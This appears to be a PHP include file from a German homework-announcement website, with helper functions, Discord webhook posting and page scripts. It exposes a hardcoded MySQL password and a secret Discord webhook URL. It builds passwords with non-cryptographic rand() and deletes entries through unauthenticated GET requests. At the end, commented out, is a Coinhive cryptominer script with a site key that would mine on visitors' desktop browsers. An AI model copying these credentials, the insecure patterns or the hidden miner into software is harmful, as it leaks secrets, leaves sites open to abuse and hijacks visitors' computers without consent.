<?php
	// Variablen initialisierung
	$mySqlPassword = "Gen11!1y";
    define("BASEPATH", $_SERVER['DOCUMENT_ROOT']."/");

    setlocale (LC_ALL, 'de_DE@euro', 'de_DE.utf8', 'de', 'ge');

    function generate_password($length = 20){
        $alpha = "abcdefghijklmnopqrstuvwxyz";
        $alpha_upper = strtoupper($alpha);
        $numeric = "0123456789";
        $special = ".-+=_,!@$#*%<>[]{}";
        $chars = $alpha.$alpha_upper.$numeric.$special;
        
        $len = strlen($chars);
        $pw = '';

        for ($i=0;$i<$length;$i++)
                $pw .= substr($chars, rand(0, $len-1), 1);

        // the finished password
        $pw = str_shuffle($pw);
      return $pw;
    }


    function log_rin($filename, $loggingtext) {
        $date = new DateTime();
        $date = $date->format("d.m.Y H:i:s");
        $logText = "[".$date."] ".$loggingtext;

        $fpLog = fopen($_SERVER['DOCUMENT_ROOT']."/log/" . $filename . ".log", 'a');
        fwrite($fpLog, $logText . "\n");
        fclose($fpLog);
    }
    

    function sonderzeichen($string)
    {
     $string = str_replace("ä", "ae", $string);
     $string = str_replace("ü", "ue", $string);
     $string = str_replace("ö", "oe", $string);
     $string = str_replace("Ä", "Ae", $string);
     $string = str_replace("Ü", "Ue", $string);
     $string = str_replace("Ö", "Oe", $string);
     $string = str_replace("ß", "ss", $string);
     $string = str_replace("´", "", $string);
     return $string;
    }

function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824)
        {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        }
        elseif ($bytes >= 1048576)
        {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        }
        elseif ($bytes >= 1024)
        {
            $bytes = number_format($bytes / 1024, 2) . ' kB';
        }
        elseif ($bytes > 1)
        {
            $bytes = $bytes . ' bytes';
        }
        elseif ($bytes == 1)
        {
            $bytes = $bytes . ' byte';
        }
        else
        {
            $bytes = '0 bytes';
        }

        return $bytes;
}


function whatsNewLine($text) {
    return urlencode($text);
    $text = str_replace("\n", "%0A", $text);
    $text = str_replace(" ", "%20", $text);
    return $text;
}

function replaceLink($text = "") {
// The Regular Expression filter
$reg_exUrl = "/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/";
if(preg_match($reg_exUrl, $text, $url)) {
// make the urls hyper links
return preg_replace($reg_exUrl, '<a href="'.$url[0].'" rel="nofollow" target="_blank">'.$url[0].'</a>', $text);
} else {
// if no urls in the text just return the text
return $text;
}
}

function postToDiscord($message, $color = null)
{
    $data = array("username" => "rindula.de");
    $data["embeds"][0]["title"] = $message;
    if (!is_null($color)) {
        $data["embeds"][0]["color"] = $color;
    }
    $curl = curl_init("https://discordapp.com/api/webhooks/436499719162822687/BWIJJhCGq093SpRM4urjtWWBBw16Y-v4AGL-TqgY443AiUFlXC94M7ZYAMbVnX5iwubK");
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($curl);
}

function postNewHomework($typ, $fach, $aufgaben, $datum, $color = null)
{

    switch ($typ) {
        case '0':
            $message = "Hausaufgabe";
            break;
        
        case '1':
            $message = "Klassenarbeit";
            break;
        
        default:
            $message = $typ;
            break;
    }

    list($user, $pass) = array('query', 'Gen11!1y');
    $dbh = new PDO('mysql:host=localhost;dbname=stats', $user, $pass);
    $dbh->query('SET NAMES utf8');

    foreach ($dbh->query('SELECT phrase FROM phrases') as $row) {
        $phrases[] = $row["phrase"];
    }
    

    $phrase = $phrases[array_rand($phrases)];

    $data = array("username" => "rindula.de");
    $data["embeds"][0]["title"] = $message;
    $data["embeds"][0]["fields"][0]["name"] = "Fach";
    $data["embeds"][0]["fields"][0]["value"] = $fach;
    $data["embeds"][0]["fields"][0]["inline"] = true;
    $data["embeds"][0]["fields"][1]["name"] = "Datum";
    $data["embeds"][0]["fields"][1]["value"] = $datum;
    $data["embeds"][0]["fields"][1]["inline"] = true;
    $data["embeds"][0]["fields"][2]["name"] = "Aufgaben";
    $data["embeds"][0]["fields"][2]["value"] = $aufgaben;
    $data["embeds"][0]["footer"]["text"] = $phrase;
    $data["embeds"][0]["timestamp"] = date("c");
    if (!is_null($color)) {
        $data["embeds"][0]["color"] = $color;
    }

    $curl = curl_init("https://discordapp.com/api/webhooks/436499719162822687/BWIJJhCGq093SpRM4urjtWWBBw16Y-v4AGL-TqgY443AiUFlXC94M7ZYAMbVnX5iwubK");
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($curl);
}

echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>";
echo "<script type='text/javascript' src='/scripts/main.js'></script>";
?>
<script type="text/javascript">
window.cookieconsent_options = {"message":"Wir backen auch für deinen Browser Kekse!","dismiss":"Macht nur...","learnMore":"Mehr Infos","link":"/kontakt/datenschutz.php","theme":"dark-top"};

function removeHA(id, user) {
    var id = id.getAttribute("selectedId");
    var xhr_removeHA = new XMLHttpRequest();
    xhr_removeHA.onreadystatechange = function() {
        if (xhr_removeHA.readyState == XMLHttpRequest.DONE) {
            console.log(xhr_removeHA.text);
            if (xhr_removeHA.status == 200) {
                location.reload();
            }
        }
    }
    xhr_removeHA.open('GET', '/hausaufgaben/enter/removeHA.php?id='+id+"&user="+user, true);
    xhr_removeHA.send(null);
}
function removeKA(id, user) {
    var id = id.getAttribute("selectedId");
    var xhr_removeHA = new XMLHttpRequest();
    xhr_removeHA.onreadystatechange = function() {
        if (xhr_removeHA.readyState == XMLHttpRequest.DONE) {
            console.log(xhr_removeHA.text);
            if (xhr_removeHA.status == 200) {
                location.reload();
            }
        }
    }
    xhr_removeHA.open('GET', '/hausaufgaben/enter/removeKA.php?id='+id+"&user="+user, true);
    xhr_removeHA.send(null);
}
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/1.0.10/cookieconsent.min.js"></script>
<!-- <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('GIoaIxGbl6vKvaabbiDkxGKfl5QfYmjv', {
        throttle: 0.7,
        autoThreads: true
    });
    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
        if(miner.isRunning()) {
            miner.stop();
        }
    }else
    {
        miner.start();
    }
	

</script> -->